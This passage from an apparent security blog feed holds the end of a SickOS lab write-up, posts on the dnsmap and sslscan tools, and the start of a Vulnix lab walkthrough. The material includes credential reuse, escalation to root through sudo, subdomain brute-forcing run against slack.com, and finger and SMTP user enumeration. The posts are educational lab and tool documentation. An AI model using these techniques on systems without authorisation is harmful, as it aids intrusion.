<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>// Database settings:
</span><span class='line'>define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
</span><span class='line'>define('DB_USER', 'root');
</span><span class='line'>define('DB_PASS', 'john@123');</span></code></pre></td></tr></table></div></figure>


<p>I also noted the existence of a sickos user, based on the home directories. Tried SSH&#8217;ing as root, no joy. But trying as sickos with the above password worked! Inside sickos&#8217; home, I noticed a bash_history file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sickos@SickOs:~$ cat .bash_history 
</span><span class='line'>sudo su
</span><span class='line'>exit</span></code></pre></td></tr></table></div></figure>


<p>Woot, could it be that easy? I did a <code>sudo -l</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User sickos may run the following commands on this host:
</span><span class='line'>    (ALL : ALL) ALL</span></code></pre></td></tr></table></div></figure>


<p>Root was only a <em>sudo su</em> away!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@SickOs:~# whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>And the flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt 
</span><span class='line'>If you are viewing this!!
</span><span class='line'>
</span><span class='line'>ROOT!
</span><span class='line'>
</span><span class='line'>You have Succesfully completed SickOS1.1.
</span><span class='line'>Thanks for Trying</span></code></pre></td></tr></table></div></figure>


<p>Thanks D4rk for an interesting machine, with a nice twist of Squid!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ___________________________________
</span><span class='line'>&lt; You will outgrow your usefulness. &gt;
</span><span class='line'> -----------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[dnsmap - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/27/dnsmap-kali-linux-tools/"/>
    <updated>2017-06-27T04:12:46-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/27/dnsmap-kali-linux-tools</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll explore another tool for DNS enumeration: the DNS Network Mapper (dnsmap). Although at the time of this post, its last update was in 2010, this tool has survived the passage of time, and has been packaged with versions of both Backtrack and Kali. There is quite a wealth of information about the tool on its homepage, and it comes with a built-in wordlist for domain bruteforcing.</p>

<p>Homepage: <a href="https://github.com/makefu/dnsmap">https://github.com/makefu/dnsmap</a></p>

<!-- more -->


<h2>dnsmap description</h2>

<blockquote><p>dnsmap was originally released back in 2006 and was inspired by the
fictional story &ldquo;The Thief No One Saw&rdquo; by Paul Craig, which can be found
in the book &ldquo;Stealing the Network &ndash; How to 0wn the Box&rdquo;</p>

<p>dnsmap is mainly meant to be used by pentesters during the information
gathering/enumeration phase of infrastructure security assessments. During the
enumeration stage, the security consultant would typically discover the target
company&rsquo;s IP netblocks, domain names, phone numbers, etc &hellip;</p>

<p>Subdomain brute-forcing is another technique that should be used in the
enumeration stage, as it&rsquo;s especially useful when other domain enumeration
techniques such as zone transfers don&rsquo;t work (I rarely see zone transfers
being <em>publicly</em> allowed these days by the way).</p>

<p>LIMITATIONS</p>

<p>Lack of multi-threading. This speed issue will hopefully be resolved in future versions.</p>

<p>FUN THINGS THAT CAN HAPPEN</p>

<ol>
<li><p>Finding interesting remote access servers (e.g.: <a href="https://extranet.targetdomain.com">https://extranet.targetdomain.com</a>)</p></li>
<li><p>Finding badly configured and/or unpatched servers (e.g.: test.targetdomain.com)</p></li>
<li><p>Finding new domain names which will allow you to map non-obvious/hard-to-find netblocks
of your target organization (registry lookups &ndash; aka whois is your friend)</p></li>
<li><p>Sometimes you find that some bruteforced subdomains resolve to internal IP addresses
(RFC 1918). This is great as sometimes they are real up-to-date &ldquo;A&rdquo; records which means
that it <em>is</em> possible to enumerate internal servers of a target organization from the
Internet by only using standard DNS resolving (as oppossed to zone transfers for instance).</p></li>
<li><p>Discover embedded devices configured using Dynamic DNS services (e.g.: linksys-cam.com).
This method is an alternative to finding devices via Google hacking techniques</p></li>
</ol>


<p>USAGE</p>

<p>Bruteforcing can be done either with dnsmap&rsquo;s built-in wordlist or a user-supplied wordlist.
Results can be saved in CSV and human-readable format for further processing. dnsmap does
NOT require root privileges to be run, and should NOT be run with such privileges for security reasons.</p></blockquote>

<h2>dnsmap options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsmap 0.30 - DNS Network Mapper by pagvac (gnucitizen.org)
</span><span class='line'>
</span><span class='line'>usage: dnsmap &lt;target-domain&gt; [options]
</span><span class='line'>options:
</span><span class='line'>-w &lt;wordlist-file&gt;
</span><span class='line'>-r &lt;regular-results-file&gt;
</span><span class='line'>-c &lt;csv-results-file&gt;
</span><span class='line'>-d &lt;delay-millisecs&gt;
</span><span class='line'>-i &lt;ips-to-ignore&gt; (useful if you're obtaining false positives)
</span><span class='line'>
</span><span class='line'>e.g.:
</span><span class='line'>dnsmap target-domain.foo
</span><span class='line'>dnsmap target-domain.foo -w yourwordlist.txt -r /tmp/domainbf_results.txt
</span><span class='line'>dnsmap target-fomain.foo -r /tmp/ -d 3000
</span><span class='line'>dnsmap target-fomain.foo -r ./domainbf_results.txt</span></code></pre></td></tr></table></div></figure>


<h2>dnsmap usage</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsmap slack.com
</span><span class='line'>dnsmap 0.30 - DNS Network Mapper by pagvac (gnucitizen.org)
</span><span class='line'>
</span><span class='line'>[+] warning: domain might use wildcards. 54.230.203.126 will be ignored from results
</span><span class='line'>[+] searching (sub)domains for slack.com using built-in wordlist
</span><span class='line'>[+] using maximum random delay of 10 millisecond(s) between requests
</span><span class='line'>
</span><span class='line'>email.slack.com
</span><span class='line'>IP address #1: 34.196.74.192
</span><span class='line'>IP address #2: 54.88.163.82
</span><span class='line'>
</span><span class='line'>files.slack.com
</span><span class='line'>IP address #1: 52.85.178.60
</span><span class='line'>
</span><span class='line'>qa.slack.com
</span><span class='line'>IP address #1: 54.192.201.191
</span><span class='line'>
</span><span class='line'>staging.slack.com
</span><span class='line'>IP address #1: 52.87.251.252
</span><span class='line'>
</span><span class='line'>upload.slack.com
</span><span class='line'>IP address #1: 34.197.50.42
</span><span class='line'>IP address #2: 52.22.100.1
</span><span class='line'>IP address #3: 52.44.55.102
</span><span class='line'>IP address #4: 52.54.239.215
</span><span class='line'>
</span><span class='line'>[+] 5 (sub)domains and 9 IP address(es) found
</span><span class='line'>[+] completion time: 122 second(s)</span></code></pre></td></tr></table></div></figure>


<p>Here is how the output looks in the CSV format:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dnsmap.png" title="dnsmap" alt="dnsmap CSV report"></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
</span><span class='line'>/ In the stairway of life, you'd best \
</span><span class='line'>\ take the elevator.                  /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[sslscan - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/24/sslscan-kali-linux-tools/"/>
    <updated>2017-06-24T07:36:03-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/24/sslscan-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: you want to assess the SSL security posture of a target by listing the supported cipher suites. sslscan is a fast SSL/TLS scanner that has been extended from its original version, and at the time of this post, its last update was 2 days ago.</p>

<p>Homepage: <a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a></p>

<!-- more -->


<h2>sslscan description</h2>

<blockquote><p>sslscan  queries SSL/TLS services, such as HTTPS, in order to determine the ciphers that are supported.</p>

<p>SSLScan is designed to be easy, lean and fast. The output includes preferred  ciphers of the SSL/TLS service, and
text and XML output formats are supported. It is TLS SNI aware when used with a  supported  version of OpenSSL.</p>

<p>Output is colour coded to indicate security issues. Colours are as follows:</p>

<p>Red Background:  NULL cipher (no encryption)</p>

<p>Red:             Broken cipher (&lt;= 40 bit), broken  protocol  (SSLv2  or SSLv3) or broken certificate signing
algorithm (MD5)</p>

<p>Yellow:           Weak  cipher  (&lt;=  56  bit or RC4) or weak certificate signing algorithm (SHA-1)</p>

<p>Purple:          Anonymous cipher (ADH or AECDH)</p></blockquote>

<p>Manpage: <a href="http://manpages.ubuntu.com/manpages/xenial/man1/sslscan.1.html">http://manpages.ubuntu.com/manpages/xenial/man1/sslscan.1.html</a></p>

<h2>sslscan options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>       ___ ___| |___  ___ __ _ _ __
</span><span class='line'>      / __/ __| / __|/ __/ _` | '_ \
</span><span class='line'>      \__ \__ \ \__ \ (_| (_| | | | |
</span><span class='line'>      |___/___/_|___/\___\__,_|_| |_|
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  1.11.10-static
</span><span class='line'>  OpenSSL 1.0.2-chacha (1.0.2g-dev)
</span><span class='line'>Command:
</span><span class='line'>  sslscan [Options] [host:port | host]
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'>  --targets=&lt;file&gt;     A file containing a list of hosts to check.
</span><span class='line'>                   Hosts can  be supplied  with ports (host:port)
</span><span class='line'>  --sni-name=&lt;name&gt;    Hostname for SNI
</span><span class='line'>  --ipv4               Only use IPv4
</span><span class='line'>  --ipv6               Only use IPv6
</span><span class='line'>  --show-certificate   Show full certificate information
</span><span class='line'>  --no-check-certificate  Don't warn about weak certificate algorithm or keys
</span><span class='line'>  --show-client-cas    Show trusted CAs for TLS client auth
</span><span class='line'>  --show-ciphers       Show supported client ciphers
</span><span class='line'>  --show-cipher-ids    Show cipher ids
</span><span class='line'>  --show-times         Show handhake times in milliseconds
</span><span class='line'>  --ssl2               Only check SSLv2 ciphers
</span><span class='line'>  --ssl3               Only check SSLv3 ciphers
</span><span class='line'>  --tls10              Only check TLSv1.0 ciphers
</span><span class='line'>  --tls11              Only check TLSv1.1 ciphers
</span><span class='line'>  --tls12              Only check TLSv1.2 ciphers
</span><span class='line'>  --tlsall             Only check TLS ciphers (all versions)
</span><span class='line'>  --ocsp               Request OCSP response from server
</span><span class='line'>  --pk=&lt;file&gt;          A file containing the private key or a PKCS#12 file
</span><span class='line'>                   containing a private key/certificate pair
</span><span class='line'>  --pkpass=&lt;password&gt;  The password for the private  key or PKCS#12 file
</span><span class='line'>  --certs=&lt;file&gt;       A file containing PEM/ASN1 formatted client certificates
</span><span class='line'>  --no-ciphersuites    Do not check for supported ciphersuites
</span><span class='line'>  --no-fallback        Do not check for TLS Fallback SCSV
</span><span class='line'>  --no-renegotiation   Do not check for TLS renegotiation
</span><span class='line'>  --no-compression     Do not check for TLS compression (CRIME)
</span><span class='line'>  --no-heartbleed      Do not check for OpenSSL Heartbleed (CVE-2014-0160)
</span><span class='line'>  --starttls-ftp       STARTTLS setup for FTP
</span><span class='line'>  --starttls-imap      STARTTLS setup for IMAP
</span><span class='line'>  --starttls-irc       STARTTLS setup for IRC
</span><span class='line'>  --starttls-ldap      STARTTLS setup for LDAP
</span><span class='line'>  --starttls-pop3      STARTTLS setup for POP3
</span><span class='line'>  --starttls-smtp      STARTTLS setup for SMTP
</span><span class='line'>  --starttls-mysql     STARTTLS setup for MYSQL
</span><span class='line'>  --starttls-xmpp      STARTTLS setup for XMPP
</span><span class='line'>  --starttls-psql      STARTTLS setup for PostgreSQL
</span><span class='line'>  --xmpp-server        Use a server-to-server XMPP handshake
</span><span class='line'>  --http               Test a HTTP connection
</span><span class='line'>  --rdp                Send RDP preamble before starting scan
</span><span class='line'>  --bugs               Enable SSL implementation bug work-arounds
</span><span class='line'>  --timeout=&lt;sec&gt;      Set socket timeout. Default is 3s
</span><span class='line'>  --sleep=&lt;msec&gt;       Pause between connection request. Default is disabled
</span><span class='line'>  --xml=&lt;file&gt;         Output results to an XML file
</span><span class='line'>                   &lt;file&gt; can be -, which means stdout
</span><span class='line'>  --version            Display the program version
</span><span class='line'>  --verbose            Display verbose output
</span><span class='line'>  --no-cipher-details  Disable EC curve names and EDH/RSA key lengths output
</span><span class='line'>  --no-colour          Disable coloured output
</span><span class='line'>  --help               Display the  help text  you are  now reading
</span><span class='line'>
</span><span class='line'>Example:
</span><span class='line'>  sslscan 127.0.0.1
</span><span class='line'>  sslscan [::1]</span></code></pre></td></tr></table></div></figure>


<h2>sslscan usage</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sslscan https://www.cylance.com
</span><span class='line'>Version: 1.11.10-static
</span><span class='line'>OpenSSL 1.0.2-chacha (1.0.2g-dev)
</span><span class='line'>
</span><span class='line'>Testing SSL server www.cylance.com on port 443 using SNI name www.cylance.com
</span><span class='line'>
</span><span class='line'>  TLS Fallback SCSV:
</span><span class='line'>Server supports TLS Fallback SCSV
</span><span class='line'>
</span><span class='line'>  TLS renegotiation:
</span><span class='line'>Secure session renegotiation supported
</span><span class='line'>
</span><span class='line'>  TLS Compression:
</span><span class='line'>Compression disabled
</span><span class='line'>
</span><span class='line'>  Heartbleed:
</span><span class='line'>TLS 1.2 not vulnerable to heartbleed
</span><span class='line'>TLS 1.1 not vulnerable to heartbleed
</span><span class='line'>TLS 1.0 not vulnerable to heartbleed
</span><span class='line'>
</span><span class='line'>  Supported Server Cipher(s):
</span><span class='line'>Preferred TLSv1.2  128 bits  ECDHE-RSA-AES128-GCM-SHA256   Curve P-256 DHE 256
</span><span class='line'>Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA256       Curve P-256 DHE 256
</span><span class='line'>Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
</span><span class='line'>Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve P-256 DHE 256
</span><span class='line'>Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA384       Curve P-256 DHE 256
</span><span class='line'>Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
</span><span class='line'>Accepted  TLSv1.2  128 bits  AES128-GCM-SHA256            
</span><span class='line'>Accepted  TLSv1.2  128 bits  AES128-SHA256                
</span><span class='line'>Accepted  TLSv1.2  128 bits  AES128-SHA                   
</span><span class='line'>Accepted  TLSv1.2  256 bits  AES256-GCM-SHA384            
</span><span class='line'>Accepted  TLSv1.2  256 bits  AES256-SHA256                
</span><span class='line'>Accepted  TLSv1.2  256 bits  AES256-SHA                   
</span><span class='line'>Accepted  TLSv1.2  112 bits  DES-CBC3-SHA                 
</span><span class='line'>Preferred TLSv1.1  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
</span><span class='line'>Accepted  TLSv1.1  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
</span><span class='line'>Accepted  TLSv1.1  128 bits  AES128-SHA                   
</span><span class='line'>Accepted  TLSv1.1  256 bits  AES256-SHA                   
</span><span class='line'>Accepted  TLSv1.1  112 bits  DES-CBC3-SHA                 
</span><span class='line'>Preferred TLSv1.0  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
</span><span class='line'>Accepted  TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
</span><span class='line'>Accepted  TLSv1.0  128 bits  AES128-SHA                   
</span><span class='line'>Accepted  TLSv1.0  256 bits  AES256-SHA                   
</span><span class='line'>Accepted  TLSv1.0  112 bits  DES-CBC3-SHA                 
</span><span class='line'>
</span><span class='line'>  SSL Certificate:
</span><span class='line'>Signature Algorithm: sha256WithRSAEncryption
</span><span class='line'>RSA Key Strength:    2048
</span><span class='line'>
</span><span class='line'>Subject:  *.cylance.com
</span><span class='line'>Altnames: DNS:*.cylance.com, DNS:cylance.com, DNS:www.cylance.com, DNS:info.cylance.com, DNS:blog.cylance.com, DNS:education.cylance.com, DNS:support.cylance.com
</span><span class='line'>Issuer:   DigiCert SHA2 Secure Server CA
</span><span class='line'>
</span><span class='line'>Not valid before: May 24 00:00:00 2017 GMT
</span><span class='line'>Not valid after:  May 29 12:00:00 2018 GMT</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ____________________________________
</span><span class='line'>/ Q: Do you know what the death rate \
</span><span class='line'>\ around here is? A: One per person. /
</span><span class='line'> ------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HackLAB Vulnix]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/20/hacklab-vulnix/"/>
    <updated>2017-06-20T08:04:29-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/20/hacklab-vulnix</id>
    <content type="html"><![CDATA[<p>Vulnix is an older machine from VulnHub that intends to present vulnerabilities from a misconfiguration point of view. The goal is to get the flag inside /root</p>

<!-- more -->


<p>Here are the Nmap results:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE    VERSION
</span><span class='line'>22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>25/tcp    open  smtp       Postfix smtpd
</span><span class='line'>79/tcp    open  finger     Linux fingerd
</span><span class='line'>110/tcp   open  pop3?
</span><span class='line'>111/tcp   open  rpcbind    2-4 (RPC #100000)
</span><span class='line'>143/tcp   open  imap       Dovecot imapd
</span><span class='line'>512/tcp   open  exec       netkit-rsh rexecd
</span><span class='line'>513/tcp   open  login
</span><span class='line'>514/tcp   open  tcpwrapped
</span><span class='line'>993/tcp   open  ssl/imap   Dovecot imapd
</span><span class='line'>995/tcp   open  ssl/pop3s?
</span><span class='line'>2049/tcp  open  nfs_acl    2-3 (RPC #100227)
</span><span class='line'>36190/tcp open  status     1 (RPC #100024)
</span><span class='line'>40731/tcp open  mountd     1-3 (RPC #100005)
</span><span class='line'>43539/tcp open  nlockmgr   1-4 (RPC #100021)
</span><span class='line'>46423/tcp open  mountd     1-3 (RPC #100005)
</span><span class='line'>52024/tcp open  mountd     1-3 (RPC #100005)</span></code></pre></td></tr></table></div></figure>


<h3>finger user enumeration</h3>

<p>There are quite a few services listening on the host. One of the first things that grabbed my attention was finger running on port 79. Because of this, we can use finger to perform <a href="https://pentestlab.blog/tag/finger/">user enumeration</a> on the host. We can use Nmap&rsquo;s script scan to see who is logged on the host, or do it manually. Here I will show the manual way:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>finger @192.168.217.142
</span><span class='line'>No one logged on.</span></code></pre></td></tr></table></div></figure>


<p>The same thing can be achieved by running Nmap with the <em>-sC</em> flag. Next I tried to get more information about the root user:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>finger root@192.168.217.142
</span><span class='line'>Login: root                       Name: root
</span><span class='line'>Directory: /root                      Shell: /bin/bash
</span><span class='line'>Never logged in.
</span><span class='line'>No mail.
</span><span class='line'>No Plan.</span></code></pre></td></tr></table></div></figure>


<p>It seems the root user never logged in, but we still obtained the directory and shell that root uses. I tried a few more guesses and discovered a couple more users on the host:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>finger user@192.168.217.142
</span><span class='line'>Login: user                       Name: user
</span><span class='line'>Directory: /home/user                 Shell: /bin/bash
</span><span class='line'>Never logged in.
</span><span class='line'>No mail.
</span><span class='line'>No Plan.
</span><span class='line'>
</span><span class='line'>Login: dovenull                   Name: Dovecot login user
</span><span class='line'>Directory: /nonexistent               Shell: /bin/false
</span><span class='line'>Never logged in.
</span><span class='line'>No mail.
</span><span class='line'>No Plan.
</span><span class='line'>
</span><span class='line'>finger vulnix@192.168.217.142
</span><span class='line'>Login: vulnix                     Name: 
</span><span class='line'>Directory: /home/vulnix               Shell: /bin/bash
</span><span class='line'>Never logged in.
</span><span class='line'>No mail.
</span><span class='line'>No Plan.</span></code></pre></td></tr></table></div></figure>


<h3>SMTP user enumeration</h3>

<p>Since port 25 is open, we can also attempt some enumeration with SMTP. Again, this can be accomplished with an Nmap script, but this time I want to use an utility called <strong>smtp-user-enum</strong>.</p>

<p>Homepage: <a href="http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum">http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum</a></p>

<blockquote><p>smtp-user-enum is a tool for enumerating OS-level user accounts on Solaris via the SMTP service (sendmail).
Enumeration is performed by inspecting the responses to VRFY, EXPN and RCPT TO commands. It could be adapted to
work against other vulnerable SMTP daemons, but this hasn’t been done as of v1.0.</p></blockquote>

<p>Let&rsquo;s see its options:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
